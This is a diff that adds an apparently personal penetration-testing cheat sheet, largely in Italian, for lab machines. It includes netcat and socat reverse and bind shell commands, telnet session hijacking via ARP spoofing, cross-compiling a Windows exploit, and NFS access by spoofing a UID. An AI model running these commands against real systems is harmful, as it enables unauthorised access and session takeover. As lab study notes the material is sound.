@@ -1,0 +1,109 @@
+ADB (ANDROID):
+
+gira sulla porta 5555 //da notare subito perchè permette di collegarsi, alcune volte anche senza che esca prompt all'utente
+adb connect 10.10.10.247:5555
+
+per connettersi pc e device android devono trovarsi sulla stessa network quindi potrebbe non funzionare
+per aggirare questo problema si può usare il port forward (dopo ci si deve connettere con adb connect 127.0.0.1:5555)
+dopo avvenuta connessione per ottenere una shell:
+adb shell
+
+LINUX VS WINDOWS:
+	- Si può dire che probabilmente una macchina è windows perchè pingandola si ha ttl=127 mentre di default linux ha 64, un cisco router dovrebbe avere 255
+
+
+INSTALL PYTHON2 PIP:
+	curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py && python2 get-pip.py
+	python2 -m pip install paramiko
+
+
+https://beautifier.io/
+
+
+TCP HIJACKING (TELNET)
+//c'è bisogno di conoscere tutte le info della connessione come ip client, ip server, porta client, porta server, rintracciabili con wireshark
+1) start ettercap (anche grafico) e selezionare itnerfaccia giusta
+2) startare unified sniffing e aggiungere targets (tramite i loro ip)
+3) dal menu mitm (un mappamondo in alto a destra) selezionare arp spoofing con opzione sniff remote connections e startarlo
+4) usare shijack:
+	./shijack-lnx eth0 192.168.120.129 34308 192.168.126.130 23		(./shijack-lnx eth0 client-ip client-port server-ip server-port)
+
+AWK:
+	date | awk 'OFS="/" {print$2,$3,$6}'
+	awk -F: '$3 >= 1000 {print $1,$6}' /etc/passwd
+
+SERVER:
+	python3 -m http.server 443
+	php -S 0.0.0.0:80 -t .
+
+CLONE WEBSITE:
+httrack
+
+CROSSCOMPILING:
+	sudo apt-get install mingw-64
+	i686-w64-migw32-gcc 42341.c -o exploit.exe -lws2_32			//compile from linux an exploit written for windows
+	//execute windows programs on linux: wine
+
+START WEB SERVER:
+	python3 -m http.server 1234					//to download file from this server: wget http://10.10.16.2/file.txt
+	python -m SimpleHTTPServer 7331
+	php -S 0.0.0.0:8000
+	ruby -run -e httpd . -p 9000
+	busybox httpd -f -p 7331
+
+SEARCH FOR STRINGS ENCODED IN AN IMAGE:
+	strings nineveh.png
+	binwalk nineveh.png
+	binwalk -e nineveh.png 				//extract everything
+
+
+
+KNOCKD
+	knock 10.10.10.43 571 290 911; ssh -i _nineveh.png.extracted/secret/nineveh.priv amrois@nineveh.htb
+
+
+NETCAT
+	nc -nv 10.10.10.10 225				//attempt connection as client
+	nc -nlvp 4444		//listener
+	nc -nv 10.11.2.22 4444 -e /bin/bash			//send rev shell with netcat
+	trasferimento file tramite netcat:
+		nc -nlvp 4444 > incoming.exe				//macchina che riceve il file
+		nc -nv 10.11.11.22 4444 < /usr/share/res/wget.exe		//macchina che manda il file
+
+SOCAT
+	socat -TCP4:10.10.10.11:80			//client
+	socat -d -d TCP4-LISTEN:443 STDOUT		//listener (-d -d per aumentare verbosity)
+	socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+	socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+	socat - OPENSSL:10.11.0.22:443,verify=0
+	socat transfer file:
+		socat TCP-LISTEN:443,fork file:secret.txt		//send
+		socat TCP:10.11.0.4:443 file:received.txt,create	//receive
+
+INSTALL PIP2:
+	curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
+	python2 get-pip.py
+	python2 -m pip install xmltodict
+
+OPENSSL:
+	openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
+	cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+NSE RESOURCE MOUNT:
+	sudo mount -o nolock 10.11.1.72:/home ./home
+	può capitare che non si può accedere ai file del vol condiviso, alcune volte può funzionare creare un utente locale con lo stesso uid ecc e provare ad accedere con questo nuovo utente:
+		sudo adduser pwn
+		sudo sed -i -e 's/1001/1014/g' /etc/passwd 				//ci serve uid uguale a 1014 perchè è l'uid dell'utente originario che dobbiamo "copiare"
+		su pwn
+
+SSH WITH RSA KEY:
+	chmod 0600 id_rsa		//deve essere per forza 0600 altrimenti non la accetta e chiede comunque la pwd
+	ssh -i id_rsa hannah@192.168.60.22
+
+MONGODB:
+	interactive shell:
+		mongo
+
+
+SSH OLDER SUITES:
+	ssh -o KexAlgorithms=diffie-hellman-group1-sha1  daer@10.11.1.111
